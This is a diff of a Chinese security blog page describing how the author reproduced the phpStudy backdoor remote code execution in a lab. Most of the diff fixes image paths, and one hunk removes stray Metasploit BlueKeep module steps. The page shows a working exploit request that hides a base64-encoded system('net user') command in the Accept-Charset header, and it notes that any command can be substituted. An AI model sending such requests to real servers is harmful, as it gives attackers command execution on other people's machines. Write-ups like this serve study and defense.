@@ -46,15 +46,15 @@
 <meta property="og:site_name" content="Evi10x01&#39;s blog">
 <meta property="og:description" content="0x01 前言前几天晚上在某安全群里留出phpstudy后门RCE，今天抽空复现，记录自己复现与踩坑的过程。 0x02 漏洞环境靶机环境：Windows7 SP1 x64 攻击环境：Windows10 虚拟机软件：Vmware 15 Pro（其他虚拟机软件均可） phpstudy版本：phpStudy20161103 0x03 后门查找存在后门的phpStudy版本有 2016、2018。PHP版">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/09/28/phpstudy后门复现与踩坑/images/1569600523329.png">
-<meta property="og:image" content="http://yoursite.com/2019/09/28/phpstudy后门复现与踩坑/images/1569601161609.png">
-<meta property="og:image" content="http://yoursite.com/2019/09/28/phpstudy后门复现与踩坑/images/1569601277998.png">
-<meta property="og:image" content="http://yoursite.com/2019/09/28/phpstudy后门复现与踩坑/images/1569601338139.png">
-<meta property="og:updated_time" content="2019-09-27T16:48:24.500Z">
+<meta property="og:image" content="http://yoursite.com/images/1569600523329.png">
+<meta property="og:image" content="http://yoursite.com/images/1569601161609.png">
+<meta property="og:image" content="http://yoursite.com/images/1569601277998.png">
+<meta property="og:image" content="http://yoursite.com/images/1569601338139.png">
+<meta property="og:updated_time" content="2019-09-27T16:52:39.551Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpstudy后门复现与踩坑">
 <meta name="twitter:description" content="0x01 前言前几天晚上在某安全群里留出phpstudy后门RCE，今天抽空复现，记录自己复现与踩坑的过程。 0x02 漏洞环境靶机环境：Windows7 SP1 x64 攻击环境：Windows10 虚拟机软件：Vmware 15 Pro（其他虚拟机软件均可） phpstudy版本：phpStudy20161103 0x03 后门查找存在后门的phpStudy版本有 2016、2018。PHP版">
-<meta name="twitter:image" content="http://yoursite.com/2019/09/28/phpstudy后门复现与踩坑/images/1569600523329.png">
+<meta name="twitter:image" content="http://yoursite.com/images/1569600523329.png">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -405,24 +405,21 @@
 <h1 id="0x03-后门查找"><a href="#0x03-后门查找" class="headerlink" title="0x03 后门查找"></a>0x03 后门查找</h1><p>存在后门的phpStudy版本有 2016、2018。PHP版本：5.2.17、5.4.45</p>
 <p>检查php\php-5.2.17\ext ； php\php-5.2.17\ext文件夹下各个dll文件，发现在5.2.17、5.4.45版本的php_xmlrpc.dll存在问题。</p>
 <p>用记事本打开存在问题的dll，搜索eval就找到我们想看的后门。</p>
-<p><img src="images/1569600523329.png" alt></p>
+<p><img src="/images/1569600523329.png" alt></p>
 <h1 id="0x04-复现过程"><a href="#0x04-复现过程" class="headerlink" title="0x04 复现过程"></a>0x04 复现过程</h1><p>访问站点并抓包，在Accept-Encoding底下添加Accept-Charset</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /test.php HTTP/1.1</span><br><span class="line">Host: 192.168.183.130</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding:gzip,deflate</span><br><span class="line">Accept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
 
-<p>2.重载模块：reload_all</p>
-<p>3.启动0708攻击模块：use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</p>
-<p>4.查看配置：info</p>
 <p>EXP请求包是Accept-Encoding和Accept-Charset，</p>
 <p>Accept-Encoding内容设置成gzip,deflate</p>
 <p>Accept-Charset 的内容是 base64 加密：system(“net user”);</p>
 <p>命令根据自己需要来改，最终使用base64加密就行。</p>
 <p>我们来复现一下效果，如图：</p>
-<p><img src="images/1569601161609.png" alt></p>
+<p><img src="/images/1569601161609.png" alt></p>
 <p>最后发现和我预期想象的结果不太一样</p>
 <p>在这里有一个坑：抓包的时候Accept-Encoding的内容gzip,deflate前面多了一个空格</p>
-<p><img src="images/1569601277998.png" alt></p>
+<p><img src="/images/1569601277998.png" alt></p>
 <p>把gzip,deflate前面多余的空格删掉再试试：</p>
-<p><img src="images/1569601338139.png" alt></p>
+<p><img src="/images/1569601338139.png" alt></p>
 <p>可以看到命令已经执行成功了。</p>
 <h1 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05 结语"></a>0x05 结语</h1><p>平时看到一些比较简单的漏洞往往不愿意去亲手测试，自己动手复现成功了这个技能才是属于自己的。</p>
 <p>很多事情都是相通的，渗透也是如此，细节决定成败。“百看不如一练”，在不断踩坑的路上总结问题以后就可以避免更多的坑。</p>
